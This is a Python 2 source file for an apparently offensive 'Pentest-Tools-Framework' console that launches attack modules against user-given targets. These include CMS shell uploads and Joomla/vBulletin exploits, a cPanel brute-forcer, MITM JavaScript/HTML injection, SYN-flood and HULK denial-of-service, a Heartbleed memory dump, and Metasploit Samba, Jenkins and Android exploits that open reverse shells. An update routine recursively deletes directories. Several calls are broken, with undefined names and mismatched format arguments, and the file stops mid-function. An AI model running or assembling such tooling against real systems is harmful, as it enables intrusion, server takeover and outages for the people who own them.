#!/usr/bin/python
import os, sys, subprocess, bs4,signal
from time import sleep
import os as sistema
import core
import readline, rlcompleter
from urllib2 import quote
from socket import timeout
from urllib2 import urlopen
from urllib2 import Request
import readline, rlcompleter
from sys import argv
from commands import *
import _py_
from core import help

R = '\033[31m' # Red
N = '\033[1;37m' # White
G = '\033[32m' # Green
O = '\033[0;33m' # Orange
B = '\033[1;34m' #Blue
E = '\033[0m' # End
def clean():
    os.system("clear")

#EXPLOITS
def php():
   while True:
       list = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/php_thumb_shell_upload"+N+"): ")
       if list == 'show options':
           help.option()
           php()
       elif list == "back":
            core.menu.exploits()

       elif list == 'set target':
            tar = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/php_thumb_shell_upload (set target)"+N+"): ")
            print "target =>"+R+"",go
            go = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/php_thumb_shell_upload "+N+"): ")
            if go == "run":
                time.sleep(2)
                print ""+B+"[*] "+N+"Starting attacks..."
                os.system("cd modules;cd exploit_phpthumb;perl rcexploit.pl %s" % (tar))
                print ""+B+"[*]"+N+" Job finished!"
                php()
            elif go =='back':
                 core.menu.exploits()
       elif list == 'clear':
            clean()
            php()
       else:
           print "Wrong Command => ", list
           print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
           php()

def vb():
   while True:
       list = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/vbulletin"+N+"): ")
       if list == 'show options':
           help.option()
           vb()
       elif list == "back":
            core.menu.exploits()

       elif list == 'set target':
            vv = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/vbulletin (vBulletin$)"+N+"): ")
            print'Target =>', vv
            go = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/vbulletin "+N+"): ")
            if go == "run":
                os.system("python modules/vbulletin/vb.py %s" % (vv))
                vb()
            elif go =='back':
                 core.menu.exploits()
       elif list == 'clear':
            clean()
            vb()
       else:
           print "Wrong Command => ", list
           print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
           vb()

def cpanel():
    while True:
        vc = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/cpanel_bruteforce"+N+"): ")
        if vc == 'show options':
            help.option()
            cpanel()
        elif vc == "back":
            core.menu.exploits()
        elif vc == 'set target':
            usr = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/cpanel_bruteforce (set user)"+N+"): ")
            print "username = >"+R+"",usr
            port = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/cpanel_bruteforce (set lport)"+N+"): ")
            print "LPORT = > "+R+"",port
            pss = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/cpanel_bruteforce (set list)"+N+"): ")
            print "list =>"+R+"",pss
            pas = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/cpanel_bruteforce (set savePass)"+N+"): ")
            print "save on => "+R+"",pas
            god = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/cpanel_bruteforce"+N+"): ")
            if god == "run":
                print ""+B+"[*] "+N+"Starting attacks..."
                os.system("cd modules;cd cpanel;perl cpanel.pl %s %s %s %s %s" % (vc,usr,port,pss,pas))
                print ""+B+"[*]"+N+" Job finished!"
                print
                cpanel()
            elif god == 'back':
                core.menu.exploits()
        elif vc =='clear':
            clean()
            cpanel()
        else:
            print "Wrong Command => ", vc
            print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
            cpanel()

def java():
    while True:
        jav = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/inject_javascript"+N+"): ")
        if jav == 'show options':
            help.option()
            java()
        elif jav == "back":
            core.menu.exploits()
        elif jav == 'set target':
             parse = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/inject_javascript (set parse)"+N+"): ")
             ips = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/inject_javascript (set ips)"+N+"): ")
             js_file = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/inject_javascript (set js_file)"+N+"): ")
             up_interface = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/inject_javascript (set up_interface)"+N+"): ")
             gateway = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/inject_javascript (set gateway)"+N+"): ")
             ja = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/inject_javascript"+N+"): ")
             if ja =="run":
                os.system("xettercap %s --proxy-module=injectjs --js-file %s -I %s --gateway %s" % (parse, ips, js_file, up_interface, gateway))
                java()
             elif ja =="back":
                  core.menu.exploits()
        elif jav == 'clear':
            clean()
            java()
        else:
            print "Wrong Command => ", jav
            print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
            java()

def joomla():
    while True:
        jom = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/joomla_com_hdflayer"+N+"): ")
        if jom == 'show options':
            help.option()
            joomla()
        elif jom == "back":
            core.menu.exploits()
        elif jom == 'set target':
              t = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploi/joomla_com_hdflayer (set target)"+N+"): ")
              print "target => "+R+"",t
              f = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploi/joomla_com_hdflayer (set shellock)"+N+"): ")
              print "target => "+R+"",f
              r = raw_input(""+N+"(Pentest)> ("+B+"modules/exploits)("+R+"exploit/joomla_com_hdflayer"+N+"): ")
              if r == "run":
                  print ""+B+"[*] "+N+"Starting attacks..."
                  os.system("cd modules;cd exploit_joomla;python exploitjoomla.py -t %s -f %s" % (t,f))
                  print ""+B+"[*]"+N+" Job finished!"
                  print
                  joomla()
              elif r == 'back':
                   core.menu.exploits()
        elif jom == 'clear':
            clean()
            joomla()
        else:
            print "Wrong Command => ", jom
            print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
            joomla()

def shell():
    while True:
        sel = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/wp_symposium_shell_upload"+N+"): ")
        if sel == 'show options':
            help.option()
            shell()
        elif sel == "back":
            core.menu.exploits()
        elif sel == 'set target':
             vc = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/wp_symposium_shell_upload (set target)"+N+"): ")
             print "target => "+R+"",vc
             fl = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploi/wp_symposium_shell_upload (set shellock)"+N+"): ")
             print "shell location = > "+R+"",fl
             ru = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploi/wp_symposium_shell_upload"+N+"): ")
             if ru == "run":
                 print ""+B+"[*] "+N+"Starting attacks..."
                 os.system("cd modules;cd prestashop;python wp-symposium.py -t %s -f %s" % (vc,fl))
                 print ""+B+"[*]"+N+" Job finished!"
                 print
                 core.menu.exploits()
             elif ru == 'back':
                 core.menu.exploits()
        elif sel =='clear':
            clean()
            shell()
        else:
            print "Wrong Command => ", sel
            print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
            shell()


def jomday():
    while True:
        day = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/joomla0day_com_myngallery"+N+"): ")
        if day == 'show options':
            help.option()
            jomday()
        elif day == "back":
            core.menu.exploits()
        elif day == 'set target':
             ft = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploi/joomla0day_com_myngallery (set target)"+N+"): ")
             print "target =>"+R+"",ft
             gr = raw_input(""+N+"(Pentest)> ("+B+"modules/exploits)("+R+"exploi/joomla0day_com_myngallery"+N+"): ")
             if gr == "run":
                 time.sleep(1)
                 print ""+B+"[*] "+N+"Starting attacks..."
                 os.system("cd modules;cd jom0;perl 0day.pl %s" % (ft))
                 print ""+B+"[*]"+N+" Job finished!"
                 print
                 jomday()
             elif gr == 'back':
                 core.menu.exploits()
        elif day == 'clear':
            clean()
            jomday()
        else:
            print "Wrong Command => ", day
            print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
            jomday()


def jomsi():
    while True:
        si = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/joomla_simple_shell"+N+"): ")
        if si == 'show options':
            help.option()
            jomsi()
        elif si == "back":
            core.menu.exploits()
        elif si== 'set target':
             ru = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/joomla_simple_shell (set target)"+N+"): ")
             print "target =>", ru
             star = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/joomla_simple_shell"+N+"): ")
             if star == 'run':
                 os.system("cd modules;cd joomla_ex;python joomla.py")
                 print ""+B+"[*]"+N+" Job finished!"
                 print
                 jomsi()
             elif star == 'back':
                 core.menu.exploits()
        elif si =='clear':
            clean()
            jomsi()
        else:
            print "Wrong Command => ", si
            print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
            jomsi()


def jomfox():
    while True:
        jj = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/joomla_com_foxcontact"+N+"): ")
        if jj == 'show options':
            help.option()
            jomfox()
        elif jj == "back":
            core.menu.exploits()
        elif jj== 'set target':
             ts = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/joomla_com_foxcontact (set target)"+N+"): ")
             print "target => "+R+"",ts
             print ""+N+"=>"+N+" id?"+R+" example.com/index.php?option=com_foxcontact&view=foxcontact&Itemid="+G+"161 "+R+"<="
             cid = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/joomla_com_foxcontact (set CID)"+N+"): ")
             print "CID => "+R+"",cid
             kt = raw_input(""+N+"(Pentest)> ("+B+"modules/exploits)("+R+"exploit/joomla_com_foxcontact"+N+"): ")
             if kt == "run":
                 time.sleep(1)
                 print ""+B+"["+R+"*"+B+"]"+N+" Starting attacks..."
                 os.system("cd modules;cd com_foxcontact;python exploit.py --url %s --cid %s" % (ts,cid))
                 print ""+B+"[*]"+N+" Job finished!"
                 print
                 jomfox()
             else:
                 jomfox()
        elif jj =='clear':
            clean()
            jomfox()
        else:
            print "Wrong Command => ", jj
            print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
            jomfox()

def jmauto():
    while True:
        jm = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/jm_auto_change_pswd"+N+"): ")
        if jm == 'show options':
            help.option()
            jmauto()
        elif jm == "back":
            core.menu.exploits()
        elif jm == 'set target':
             er = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/jm_auto_change_pswd (set target)"+N+"): ")
             print "target =>"+R+"",er
             pa = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/jm_auto_change_pswd (set newpass)"+N+"): ")
             print "new pass => "+R+"",pa
             y = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/jm_auto_change_pswd"+N+"): ")
             time.sleep(2)
             if y == "run":
                 print ""+B+"[*] "+N+"Starting attacks..."
                 os.system("cd modules;cd autoriset_joomla0day;perl joomlariset.pl %s %s" % (er,pa))
                 print ""+B+"[*]"+N+" Job finished!"
                 print
                 jmauto()
             else:
                 jmauto()
        elif jm == 'clear':
            clean()
            jmauto()
        else:
            print "Wrong Command => ", jm
            print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
            jmauto()


def dos():
    while True:
        dd = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/power_dos"+N+"): ")
        if dd == 'show options':
            help.option()
            dos()
        elif dd == "back":
            core.menu.exploits()
        elif dd == 'set target':
             target = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/power_dos (set target)"+N+"): ")
             print "target =>"+R+"",target
             run = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/power_dos"+N+"): ")
             if run == "run":
                 os.system("cd modules;cd hulk_attacks;python hulk.py %s" % (target))
                 print ""+B+"[*]"+N+" Job finished!"
                 print
                 dos()
             else:
                 dos()
        elif dd == 'clear':
            clean()
            dos()
        else:
            print "Wrong Command => ", dd
            print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
            dos()


def android():
    while True:
        dd = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/android_remote_acces"+N+"): ")
        if dd == 'show options':
            help.option()
            android()
        elif dd == "back":
            core.menu.exploits()
        elif dd == 'set target':
            os.system("cd modules;cd android;python2 android.py")
            android()
        elif dd == 'clear':
            clean()
            android()
        else:
            print "Wrong Command => ", dd
            print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
            android()


def dns_b():
    while True:
        dn = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/dns_bruteforce"+N+"): ")
        if dn == 'show options':
            help.option()
            dns_b()
        elif dn == 'back':
            core.menu.exploits()
        elif dn == 'set target':
            port = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploi/dns_bruteforce (set port)"+N+"): ")
            target = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploi/dns_bruteforce (set target)"+N+"): ")
            print "port target => ", target, port
            rr = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploi/dns_bruteforce"+N+"): ")
            if rr == 'run':
              os.system("nmap -p %s --script dns-brute.nse %s " % (port, target))
              dns_b()
            else:
                dns_b()
        elif dn == 'clear':
            clean()
            dns_b()
        else:
            print "Wrong Command => ", dn
            print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
            dns_b()



def hping3():
    while True:
        dos = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploi/dos_attack"+N+"): ")
        if dos == 'show options':
           help.option()
           hping3()
        elif dos =='back':
            core.menu.exploits()
        elif dos =='clear':
            clean()
            hping3()
        elif dos =='set target':
            target =raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploi/dos_attack (set target)"+N+"): ")
            print "target => ", target
            if target == 'run':
               os.system("hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source %s " % (target))
               hping3()
            else:
                hping3()
        else:
            print "Wrong Command => ", hping3
            print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
            hping3()

def html11():
    while True:
        inj = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploi/inject_html"+N+"): ")
        if inj =='show options':
            help.option()
            html11()
        elif inj =='back':
            core.menu.exploits()
        elif inj =='clear':
            clean()
            html11()
        elif inj =='set target':
            parse =raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploi/inject_html ("+G+"target_parse)"+N+"): ")
            ips =raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploi/inject_html ("+G+"target_ips)"+N+"): ")
            html =raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploi/inject_html ("+G+"file_html)"+N+"): ")
            interface =raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploi/inject_html ("+G+"up_interface)"+N+"): ")
            gateway =raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploi/inject_html ("+G+"gateway)"+N+"): ")
            print "press run for Attacks"
            ra = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploi/inject_html"+N+"): ")
            if ra == 'run':
               os.system("xettercap %s %s --proxy-module=/opt/Pentest/modules/bettercap/lib/bettercap/proxy/http/modules/injecthtml.rb --js-file %s -I %s --gateway %s " % (parse, ips, html, interface, gateway))
               html11()
            else:
                html11()
        else:
            print "Wrong Command => ", inj
            print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
            html11()


def shake():
    while True:
        sha = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploi/shakescreen "+N+"): ")
        if sha =='show options':
            help.option()
            shake()
        elif sha =='back':
            core.menu.exploits()
        elif sha =='clear':
            clean()
            shake()
        elif sha =='set target':
            parse =raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploi/shakescreen ("+G+"target_parse)"+N+"): ")
            ips =raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploi/shakescreen ("+G+"target_ips)"+N+"): ")
            interface =raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploi/shakescreen ("+G+"up_interface)"+N+"): ")
            gateway =raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploi/shakescreen ("+G+"gateway)"+N+"): ")
            print "press run for Attacks"
            ra = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploi/shakescreen"+N+"): ")
            if ra == 'run':
               os.system("xettercap %s %s --proxy-module=injectjs --js-file '/opt/Pentest/modules/bettercap/modules/js/shakescreen.js' -I %s --gateway %s " % (parse, ips, interface, gateway))
               shake()
            else:
                shake()
        else:
            print "Wrong Command => ", sha
            print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
            shake()


def waf():
    while True:
        sha = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploi/bypass_waf"+N+"): ")
        if sha =='show options':
            help.option()
            waf()
        elif sha =='back':
            core.menu.exploits()
        elif sha =='clear':
            clean()
            waf()
        elif sha =='set target':
            target =raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploi/bypass_waf ("+G+"target)"+N+"): ")
            ra = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploi/bypass_waf"+N+"): ")
            if ra == 'run':
               os.system('python modules/wafninja/wafninja.py bypass -u %s -p "Name=PAYLOAD&Submit=Submit" -c "phpsessid=value" -t xss -o log/output.html' % (target))
               waf()
            else:
                waf()
        else:
            print "Wrong Command => ", sha
            print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
            waf()


def enum():
    while True:
        sha = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploi/enumeration"+N+"): ")
        if sha =='show options':
            help.option()
            enum()
        elif sha =='back':
            core.menu.exploits()
        elif sha =='clear':
            clean()
            enum()
        elif sha =='set target':
            target =raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploi/enumeration ("+G+"target)"+N+"): ")
            ra = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploi/enumeration"+N+"): ")
            if ra == 'run':
               os.system('perl modules/enum/enum4linux.pl -U %s ' % (target))
               enum()
            else:
                enum()
        else:
            print "Wrong Command => ", sha
            print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
            enum()

def res():
    while True:
        sha = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploi/restrict_anonymous"+N+"): ")
        if sha =='show options':
            help.option()
            res()
        elif sha =='back':
            core.menu.exploits()
        elif sha =='clear':
            clean()
            res()
        elif sha =='set target':
            u =raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploi/restrict_anonymous ("+G+"User)"+N+"): ")
            p =raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploi/restrict_anonymous ("+G+"Pass)"+N+"): ")
            target =raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploi/restrict_anonymous ("+G+"Target)"+N+"): ")
            ra = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploi/enumeration"+N+"): ")
            if ra == 'run':
               os.system('perl modules/enum/enum4linux.pl -u %s -p %s -U %s ' % (u, p, target))
               res()
            else:
                res()
        else:
            print "Wrong Command => ", sha
            print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
            res()

def robots_txt():
    while True:
        map =raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/robots_txt"+N+"): ")
        if map == 'show options':
            help.option()
            robots_txt()
        elif map == 'back':
            core.menu.exploits()
        elif map =='set target':
             _py_.explore.robots_txt().run()
             print
             robots_txt()
        elif map =='clear':
            clean()
            robots_txt()
        else:
            print "Wrong Command => ", map
            print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
            robots_txt()
def ipconfig():
    print "\n"
    os.system('iwgetid -r') # Get wireless network name
    os.system("ip addr | grep 'state UP' -A1 | tail -n1 | awk '{print $2}' | cut -f1  -d'/'") # Get network mac
    os.system("hostname -I") # Local IP address
    os.system("hostname") # hostname
    print "\n"
def update():
    print ""+B+"~ "+N+"Updating..."
    sleep(3)
    print
    print ""+G+" Pentest WAS UPGRADED!"
    sleep(1)
    print
    print ""+N+"Cloning newly updated..."
    sleep(4)
    os.system('cd ~ ; rm -r ~/Desktop/Pentest-Tools-Framework')
    os.system('cd ~ ; rm -r /opt/Pentest-Tools-Framework')
    os.system('cd ~ ; rm -r ~/Pentest-Tools-Framework')
    os.system('cd ~ ; rm -r /root/Pentest-Tools-Framework')
    os.system("git clone https://github.com/3xploit-db/Pentest-Tools-Framework ; cd Pentest-Tools-Framework ")
    sleep(3)
    print ""+B+"~ "+N+"Updated!"
    sleep(1)
    print

def ssl():
    while True:
        map =raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/openssl_heartbleed"+N+"): ")
        if map == 'show options':
            help.option()
            ssl()
        elif map == 'back':
            core.menu.exploits()
        elif map =='set target':
             rhost =raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/openssl_heartbleed "+G+"(set RHOST)"+N+"): ")
             print "RHOST =>",rhost
             rport =raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/openssl_heartbleed "+G+"(set RPORT)"+N+"): ")
             print "RPORT =>",rport
             her =raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/openssl_heartbleed "+N+"): ")
             if her =='run':
                os.system('msfconsole -q -x"use auxiliary/scanner/ssl/openssl_heartbleed; set RHOSTS %s ; set RPORT %s ; set action DUMP ; run "' % (rhost, rport))
                print
                ssl()
        elif map =='clear':
            clean()
            ssl()
        else:
            print "Wrong Command => ", map
            print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
            ssl()
def smb():
    while True:
        map =raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/samba"+N+"): ")
        if map == 'show options':
            help.option()
            smb()
        elif map == 'back':
            core.menu.exploits()
        elif map =='set target':
             rhost =raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/samba "+G+"(set RHOST)"+N+"): ")
             print "RHOST =>",rhost
             rport =raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/samba "+G+"(set RPORT)"+N+"): ")
             print "RPORT =>",rport
             lhost =raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/samba "+G+"(set LHOST)"+N+"): ")
             print 'LHOST =>',lhost
             lport =raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/samba "+G+"(set LPORT)"+N+"): ")
             print 'LPORT =>',lport
             her =raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/samba "+N+"): ")
             if her =='run':
                os.system('msfconsole -q -x "use exploit/multi/samba/usermap_script; set RHOST %s ; set RPORT %s ; set payload cmd/unix/reverse ; set LHOST %s ; set LPORT %s ; run "' % (rhost, rport, lhost, lport))
                print
                smb()
        elif map =='clear':
            clean()
            smb()
        else:
            print "Wrong Command => ", map
            print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
            smb()
def jenkins_script_console():
    while True:
        map =raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/jenkins_script_console"+N+"): ")
        if map == 'show options':
            help.option()
            jenkins_script_console()
        elif map == 'back':
            core.menu.exploits()
        elif map =='set target':
             rhost =raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/jenkins_script_console "+G+"(set RHOST)"+N+"): ")
             print "RHOST =>",rhost
             rport =raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/jenkins_script_console "+G+"(set RPORT)"+N+"): ")
             print "RPORT =>",rport
             uri =raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/jenkins_script_console "+G+"(set targeturi/)"+N+"): ")
             print 'targeturi =>',uri
             lhost =raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/jenkins_script_console "+G+"(set LHOST)"+N+"): ")
             print 'LHOST =>',lhost
             lport =raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/jenkins_script_console "+G+"(set LPORT)"+N+"): ")
             print 'LPORT =>',lport
             her =raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/jenkins_script_console "+N+"): ")
             if her =='run':
                os.system('msfconsole -q -x "use exploit/multi/http/jenkins_script_console; set RHOST %s ; set RPORT %s ; set payload generic/shell_reverse_tcp ; set LHOST %s ; set LPORT %s ; run "' % (rhost, rport, usr, lhost, lport))
                print
                jenkins_script_console()
        elif map =='clear':
            clean()
            jenkins_script_console()
        else:
            print "Wrong Command => ", map
            print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
            jenkins_script_console()
def joomla_comfields_sqli_rce():
    while True:
        map =raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/joomla_comfields_sqli_rce"+N+"): ")
        if map == 'show options':
            help.option()
            joomla_comfields_sqli_rce()
        elif map == 'back':
            core.menu.exploits()
        elif map =='set target':
             rhost =raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/joomla_comfields_sqli_rce "+G+"(set RHOST)"+N+"): ")
             print "RHOST =>",rhost
             rport =raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/joomla_comfields_sqli_rce "+G+"(set RPORT)"+N+"): ")
             print "RPORT =>",rport
             uri =raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/joomla_comfields_sqli_rce "+G+"(set targeturi/)"+N+"): ")
             print 'targeturi =>',uri
             lhost =raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/joomla_comfields_sqli_rce "+G+"(set LHOST)"+N+"): ")
             print 'LHOST =>',lhost
             lport =raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/joomla_comfields_sqli_rce "+G+"(set LPORT)"+N+"): ")
             print 'LPORT =>',lport
             her =raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/joomla_comfields_sqli_rce "+N+"): ")
             if her =='run':
                os.system('msfconsole -q -x "use exploit/unix/webapp/joomla_comfields_sqli_rce; set RHOST %s ; set RPORT %s ; set payload generic/shell_reverse_tcp ; set LHOST %s ; set LPORT %s ; run "' % (rhost, rport, usr, lhost, lport))
                print
                joomla_comfields_sqli_rce()
        elif map =='clear':
            clean()
            joomla_comfields_sqli_rce()
        else:
            print "Wrong Command => ", map
            print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
            joomla_comfields_sqli_rce()
def webview_addjavascriptinterface():
    while True:
        map =raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/webview_addjavascriptinterface"+N+"): ")
        if map == 'show options':
            help.option()
            webview_addjavascriptinterface()
        elif map == 'back':
            core.menu.exploits()
        elif map =='set target':
             rhost =raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/webview_addjavascriptinterface "+G+"(set SRVHOST)"+N+"): ")
             print "RHOST =>",rhost
             rport =raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/webview_addjavascriptinterface "+G+"(set SRVPORT)"+N+"): ")
             print "RPORT =>",rport
             lhost =raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/webview_addjavascriptinterface "+G+"(set LHOST)"+N+"): ")
             print 'LHOST =>',lhost
             lport =raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/webview_addjavascriptinterface "+G+"(set LPORT)"+N+"): ")
             print 'LPORT =>',lport
             her =raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/webview_addjavascriptinterface "+N+"): ")
             if her =='run':
                os.system('msfconsole -q -x "use exploit/android/browser/webview_addjavascriptinterface ; set SRVHOST %s ; set SRVPORT %s ; set LHOST %s ; set LPORT %s ; run "' % (rhost, rport, lhost, lport))
                print
                webview_addjavascriptinterface()
        elif map =='clear':
            clean()
            webview_addjavascriptinterface()
        else:
            print "Wrong Command => ", map
            print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
            webview_addjavascriptinterface()
def tp_link_dos():
    while True:
        map =raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/tp_link_dos"+N+"): ")
        if map == 'show options':
            help.option()
            tp_link_dos()
        elif map == 'back':
            core.menu.exploits()
        elif map =='set target':
             host =raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/tp_link_dos "+G+"(set HOST)"+N+"): ")
             print "RHOST =>",host
             port =raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/tp_link_dos "+G+"(set PORT)"+N+"): ")
             print "RPORT =>",port
             her =raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/tp_link_dos "+N+"): ")
             if her =='run':
                os.system('python modules/dos/tp_link.py %s %s' % (host, port))
                print
                tp_link_dos()
        elif map =='clear':
            clean()
            tp_link_dos()
        else:
            print "Wrong Command => ", map
